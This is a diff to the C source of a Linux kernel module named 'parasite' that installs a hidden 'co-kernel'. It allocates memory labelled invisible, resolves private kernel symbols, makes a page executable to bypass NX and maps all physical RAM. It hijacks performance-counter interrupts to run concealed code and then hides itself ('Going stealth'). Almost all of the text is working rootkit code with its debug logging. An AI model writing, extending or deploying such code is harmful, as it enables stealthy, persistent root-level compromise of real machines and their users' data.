@@ -22,6 +22,10 @@
 #include <linux/string.h>
 #include <linux/slab.h>
 #include <linux/delay.h>
+#include <linux/sched.h>
+#include <linux/mm.h>
+#include <asm/io.h>
+#include <asm/msr.h>
 
 #include "../include/shared.h"
 #include "memory.h"
@@ -46,12 +50,24 @@ extern void component_pmi_entry(void);
 extern void pmi_trampoline_end(void);
 extern uint64_t trampoline_data[];
 
-/* Offsets into trampoline_data (see pmi_entry.S) */
-#define TD_COKERNEL_CR3     0
-#define TD_STACK_TOP        1
-#define TD_TICK_FN          2
-#define TD_SAVED_RSP        3
-#define TD_SAVED_CR3        4
+/*
+ * Byte offsets into trampoline data block (see pmi_entry.S).
+ * Mixed u64/u32 fields — use byte offsets, NOT array indices.
+ */
+#define TD_OFF_CR3            0    /* u64: co-kernel CR3 */
+#define TD_OFF_STACK          8    /* u64: co-kernel stack top */
+#define TD_OFF_TICK_FN        16   /* u64: component_tick VA */
+#define TD_OFF_SAVED_RSP      24   /* u64: runtime scratch */
+#define TD_OFF_SAVED_CR3      32   /* u64: runtime scratch */
+#define TD_OFF_COUNTER_MSR    40   /* u32: MSR addr for counter */
+#define TD_OFF_RELOAD_VAL     48   /* u64: counter reload value */
+#define TD_OFF_OVF_CLEAR_MSR  56   /* u32: MSR for overflow clear */
+#define TD_OFF_OVF_CLEAR_LO   60   /* u32: ovf clear value low */
+#define TD_OFF_OVF_CLEAR_HI   64   /* u32: ovf clear value high */
+#define TD_OFF_APIC_MODE      72   /* u32: 0=xAPIC, 1=x2APIC */
+
+/* AMD Core Performance Counter MSRs */
+#define AMD_MSR_PERF_CTR0     0xC0010201
 
 /*
  * parasite_init — Module entry point.
@@ -64,16 +80,27 @@ static int __init parasite_init(void)
     int ret;
     void *region;
     phys_addr_t phys_base;
-    struct cokernel_comm *comm;
+    phys_addr_t comm_page_phys;
+    struct ck_comm_page *comm;
+    struct ck_bootstrap_data *bd;
     void *trampoline_va;
     phys_addr_t trampoline_phys;
     size_t trampoline_size;
-    uint64_t *tramp_data;
+    unsigned long init_task_addr;
+    unsigned long *p_max_pfn;
+    unsigned long ram_size;
 
     pr_info("cokernel: === Installation starting ===\n");
 
+    /* ── Step 0: Bootstrap symbol resolver ─────────────────────── */
+    ret = ck_resolve_init();
+    if (ret) {
+        pr_err("cokernel: symbol resolver init failed: %d\n", ret);
+        return ret;
+    }
+
     /* ── Step 1: Allocate invisible memory ─────────────────────── */
-    pr_info("cokernel: [1/6] Allocating invisible memory...\n");
+    pr_info("cokernel: [1/9] Allocating invisible memory...\n");
 
     ret = ck_alloc_invisible_memory();
     if (ret) {
@@ -82,8 +109,11 @@ static int __init parasite_init(void)
     }
 
     phys_base = ck_get_phys_base();
+    comm_page_phys = ck_get_comm_page_phys();
     pr_info("cokernel: physical base = 0x%llx\n",
             (unsigned long long)phys_base);
+    pr_info("cokernel: comm page phys = 0x%llx\n",
+            (unsigned long long)comm_page_phys);
 
     /* Allocate trampoline page (stays in Linux direct map) */
     ret = ck_alloc_trampoline_page();
@@ -95,6 +125,22 @@ static int __init parasite_init(void)
     trampoline_va = ck_get_trampoline_va();
     trampoline_phys = ck_get_trampoline_phys();
 
+    /* Make trampoline page executable (direct map is NX by default) */
+    {
+        typedef int (*set_memory_x_t)(unsigned long addr, int numpages);
+        set_memory_x_t fn_set_memory_x;
+        fn_set_memory_x = (set_memory_x_t)ck_resolve_symbol("set_memory_x");
+        if (fn_set_memory_x) {
+            ret = fn_set_memory_x((unsigned long)trampoline_va, 1);
+            if (ret)
+                pr_warn("cokernel: set_memory_x failed: %d\n", ret);
+            else
+                pr_info("cokernel: trampoline page marked executable\n");
+        } else {
+            pr_warn("cokernel: set_memory_x not found, NX may cause fault\n");
+        }
+    }
+
     /* Get temporary mapping for setup operations */
     region = ck_get_temp_mapping();
     if (!region) {
@@ -103,7 +149,7 @@ static int __init parasite_init(void)
     }
 
     /* ── Step 2: Copy co-kernel binary ─────────────────────────── */
-    pr_info("cokernel: [2/6] Copying co-kernel binary (%u bytes)...\n",
+    pr_info("cokernel: [2/9] Copying co-kernel binary (%u bytes)...\n",
             cokernel_bin_len);
 
     if (cokernel_bin_len > COKERNEL_TEXT_SIZE + COKERNEL_DATA_SIZE) {
@@ -119,15 +165,51 @@ static int __init parasite_init(void)
             COKERNEL_TEXT_OFFSET);
 
     /* ── Step 3: Initialize communication page ─────────────────── */
-    pr_info("cokernel: [3/6] Initializing communication page...\n");
+    pr_info("cokernel: [3/9] Initializing communication page...\n");
 
-    comm = (struct cokernel_comm *)(region + COKERNEL_COMM_OFFSET);
+    comm = (struct ck_comm_page *)(region + COKERNEL_COMM_OFFSET);
     memset(comm, 0, sizeof(*comm));
-    comm->status = 0;   /* idle */
-    comm->magic = 0;    /* will be set by co-kernel on first tick */
+    comm->status = 0;   /* init */
 
-    /* ── Step 4: Build co-kernel page tables ───────────────────── */
-    pr_info("cokernel: [4/6] Building page tables...\n");
+    /* ── Step 4: Resolve symbols and write bootstrap data ──────── */
+    pr_info("cokernel: [4/9] Resolving symbols, writing bootstrap data...\n");
+
+    init_task_addr = ck_resolve_symbol("init_task");
+    if (!init_task_addr) {
+        pr_err("cokernel: failed to resolve init_task\n");
+        ck_remove_temp_mapping();
+        return -ENOENT;
+    }
+    pr_info("cokernel: init_task VA = 0x%lx\n", init_task_addr);
+
+    p_max_pfn = (unsigned long *)ck_resolve_symbol("max_pfn");
+    if (!p_max_pfn) {
+        pr_err("cokernel: failed to resolve max_pfn\n");
+        ck_remove_temp_mapping();
+        return -ENOENT;
+    }
+    ram_size = (*p_max_pfn) * PAGE_SIZE;
+    pr_info("cokernel: max_pfn = %lu, ram_size = %lu MB\n",
+            *p_max_pfn, ram_size / (1024 * 1024));
+
+    bd = (struct ck_bootstrap_data *)(region + COKERNEL_DATA_OFFSET);
+    bd->magic           = COKERNEL_BOOTSTRAP_MAGIC;
+    bd->init_task_dm    = LINUX_DIRECT_MAP_BASE +
+                          virt_to_phys((void *)init_task_addr);
+    bd->ram_size        = ram_size;
+    bd->self_phys_base  = phys_base;
+    bd->direct_map_base = LINUX_DIRECT_MAP_BASE;
+    bd->comm_page_va    = COKERNEL_VIRT_BASE + COKERNEL_COMM_OFFSET;
+    bd->comm_page_phys  = comm_page_phys;
+    bd->offset_task_comm = offsetof(struct task_struct, comm);
+
+    pr_info("cokernel: bootstrap_data written at DATA offset 0x%lx\n",
+            COKERNEL_DATA_OFFSET);
+    pr_info("cokernel:   init_task_dm    = 0x%llx\n", bd->init_task_dm);
+    pr_info("cokernel:   offset_task_comm = %llu\n", bd->offset_task_comm);
+
+    /* ── Step 5: Build co-kernel page tables ───────────────────── */
+    pr_info("cokernel: [5/9] Building page tables...\n");
 
     ret = ck_build_pagetables(region, phys_base, COKERNEL_TOTAL_SIZE,
                               trampoline_va, trampoline_phys);
@@ -137,8 +219,22 @@ static int __init parasite_init(void)
         return ret;
     }
 
-    /* ── Step 5: Set up PMI trampoline and execution ───────────── */
-    pr_info("cokernel: [5/6] Configuring PMI execution...\n");
+    /* ── Step 6: Map Linux physical RAM into co-kernel CR3 ─────── */
+    pr_info("cokernel: [6/9] Mapping physical RAM (%lu MB)...\n",
+            ram_size / (1024 * 1024));
+
+    ret = ck_map_linux_physmem(ram_size, trampoline_phys);
+    if (ret) {
+        pr_err("cokernel: physmem mapping failed: %d\n", ret);
+        ck_remove_temp_mapping();
+        return ret;
+    }
+
+    /* ── Step 7: Set up PMI trampoline and execution ───────────── */
+    pr_info("cokernel: [7/9] Configuring PMI execution...\n");
+
+    /* Detect CPU vendor + APIC mode early — needed for trampoline patching */
+    ck_detect_cpu_features();
 
     /*
      * Copy the PMI trampoline assembly to the dedicated page.
@@ -161,23 +257,43 @@ static int __init parasite_init(void)
 
     /*
      * Patch the data block in the trampoline copy.
-     * The data block is at a known offset from the entry point.
+     * Use byte offsets — the block has mixed u64/u32 fields.
      */
     {
         unsigned long data_offset = (unsigned long)&trampoline_data -
                                     (unsigned long)&component_pmi_entry;
-        tramp_data = (uint64_t *)(trampoline_va + data_offset);
+        void *td_base = trampoline_va + data_offset;
 
-        tramp_data[TD_COKERNEL_CR3] = ck_get_pgd_phys();
-        tramp_data[TD_STACK_TOP] = COKERNEL_VIRT_BASE + COKERNEL_STACK_TOP;
-        tramp_data[TD_TICK_FN] = COKERNEL_VIRT_BASE + COKERNEL_TEXT_OFFSET;
-        tramp_data[TD_SAVED_RSP] = 0;  /* filled at runtime */
-        tramp_data[TD_SAVED_CR3] = 0;  /* filled at runtime */
+        /* Core fields (same as V0) */
+        *(uint64_t *)(td_base + TD_OFF_CR3)       = ck_get_pgd_phys();
+        *(uint64_t *)(td_base + TD_OFF_STACK)      = COKERNEL_VIRT_BASE + COKERNEL_STACK_TOP;
+        *(uint64_t *)(td_base + TD_OFF_TICK_FN)    = COKERNEL_VIRT_BASE + COKERNEL_TEXT_OFFSET;
+        *(uint64_t *)(td_base + TD_OFF_SAVED_RSP)  = 0;
+        *(uint64_t *)(td_base + TD_OFF_SAVED_CR3)  = 0;
+
+        /* PMU counter reload (AMD or Intel) */
+        if (ck_get_is_amd()) {
+            *(uint32_t *)(td_base + TD_OFF_COUNTER_MSR) = AMD_MSR_PERF_CTR0;
+            *(uint64_t *)(td_base + TD_OFF_RELOAD_VAL)  = PMI_RELOAD_VALUE;
+            /* AMD doesn't use global overflow clear */
+            *(uint32_t *)(td_base + TD_OFF_OVF_CLEAR_MSR) = 0;
+        } else {
+            *(uint32_t *)(td_base + TD_OFF_COUNTER_MSR)   = 0x309; /* IA32_FIXED_CTR0 */
+            *(uint64_t *)(td_base + TD_OFF_RELOAD_VAL)     = PMI_RELOAD_VALUE;
+            *(uint32_t *)(td_base + TD_OFF_OVF_CLEAR_MSR)  = 0x390; /* PERF_GLOBAL_STATUS_RESET */
+            *(uint32_t *)(td_base + TD_OFF_OVF_CLEAR_LO)   = 0;
+            *(uint32_t *)(td_base + TD_OFF_OVF_CLEAR_HI)   = 1; /* bit 32 */
+        }
+
+        /* APIC mode */
+        *(uint32_t *)(td_base + TD_OFF_APIC_MODE) = ck_get_is_x2apic() ? 1 : 0;
 
         pr_info("cokernel: patched trampoline data:\n");
-        pr_info("cokernel:   CR3       = 0x%llx\n", tramp_data[TD_COKERNEL_CR3]);
-        pr_info("cokernel:   stack_top = 0x%llx\n", tramp_data[TD_STACK_TOP]);
-        pr_info("cokernel:   tick_fn   = 0x%llx\n", tramp_data[TD_TICK_FN]);
+        pr_info("cokernel:   CR3       = 0x%llx\n", *(uint64_t *)(td_base + TD_OFF_CR3));
+        pr_info("cokernel:   stack_top = 0x%llx\n", *(uint64_t *)(td_base + TD_OFF_STACK));
+        pr_info("cokernel:   tick_fn   = 0x%llx\n", *(uint64_t *)(td_base + TD_OFF_TICK_FN));
+        pr_info("cokernel:   counter   = MSR 0x%x\n", *(uint32_t *)(td_base + TD_OFF_COUNTER_MSR));
+        pr_info("cokernel:   apic_mode = %s\n", ck_get_is_x2apic() ? "x2APIC" : "xAPIC");
     }
 
     /* Set up PMI: install IDT handler + configure PMU + LAPIC */
@@ -188,11 +304,45 @@ static int __init parasite_init(void)
         return ret;
     }
 
-    /* ── Step 6: Remove temp mapping, then hide module ─────────── */
-    pr_info("cokernel: [6/6] Cleaning up and going stealth...\n");
+    /* ── Diagnostic: verify PMI fires ──────────────────────────── */
+    {
+        volatile struct ck_comm_page *diag_comm;
+        uint64_t ctr_val;
 
-    /* Remove the temporary vmap — last trace of our setup */
+        /* Read back counter to verify it was programmed */
+        if (ck_get_is_amd()) {
+            rdmsrl(AMD_MSR_PERF_CTR0, ctr_val);
+            pr_info("cokernel: [diag] AMD PerfCtr0 readback = 0x%llx\n", ctr_val);
+        } else {
+            rdmsrl(MSR_IA32_FIXED_CTR0, ctr_val);
+            pr_info("cokernel: [diag] Intel FIXED_CTR0 readback = 0x%llx\n", ctr_val);
+        }
+
+        /* Wait 200ms — should be enough for many PMI ticks */
+        msleep(200);
+
+        /* Check if co-kernel wrote to comm page */
+        diag_comm = (volatile struct ck_comm_page *)
+            phys_to_virt(comm_page_phys);
+        pr_info("cokernel: [diag] comm_page magic=0x%llx tick_count=%llu\n",
+                diag_comm->magic, diag_comm->tick_count);
+
+        /* Re-read counter to see if it progressed */
+        if (ck_get_is_amd()) {
+            rdmsrl(AMD_MSR_PERF_CTR0, ctr_val);
+            pr_info("cokernel: [diag] after 200ms: AMD PerfCtr0=0x%llx\n", ctr_val);
+        } else {
+            rdmsrl(MSR_IA32_FIXED_CTR0, ctr_val);
+            pr_info("cokernel: [diag] after 200ms: Intel FIXED_CTR0=0x%llx\n", ctr_val);
+        }
+    }
+
+    /* ── Step 8: Remove temp mapping ───────────────────────────── */
+    pr_info("cokernel: [8/9] Removing temp mapping...\n");
     ck_remove_temp_mapping();
+
+    /* ── Step 9: Hide module ───────────────────────────────────── */
+    pr_info("cokernel: [9/9] Going stealth...\n");
 
     /*
      * Brief delay to let any pending printk buffers flush.
@@ -206,8 +356,8 @@ static int __init parasite_init(void)
     pr_info("cokernel: === Installation complete ===\n");
     pr_info("cokernel: PMI firing every %llu cycles on vector 0x%02x\n",
             PMI_INTERVAL, PMI_VECTOR);
-    pr_info("cokernel: comm page at phys 0x%llx\n",
-            (unsigned long long)(phys_base + COKERNEL_COMM_OFFSET));
+    pr_info("cokernel: comm_page_phys=0x%llx\n",
+            (unsigned long long)comm_page_phys);
 
     return 0;  /* Module stays loaded but invisible */
 }
